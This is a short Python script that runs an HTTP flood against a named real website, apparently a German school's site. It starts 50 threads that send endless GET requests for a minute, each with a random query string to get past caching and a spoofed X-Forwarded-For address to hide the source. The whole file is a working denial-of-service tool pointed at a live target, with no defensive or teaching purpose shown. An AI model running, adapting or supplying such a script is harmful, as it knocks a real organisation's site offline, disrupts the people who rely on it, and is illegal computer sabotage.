import requests
import threading
import random
import string
import time

target = "https://goetheschulekl.de/"

def attack():
    while True:
        try:
            rnd = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            url = f"{target}?r={rnd}"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Cache-Control": "no-cache"
            }
            requests.get(url, headers=headers, timeout=3)
        except:
            pass

print("Starte Flood von GitHub IP...")
for i in range(50):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

time.sleep(60)
print("Fertig.")
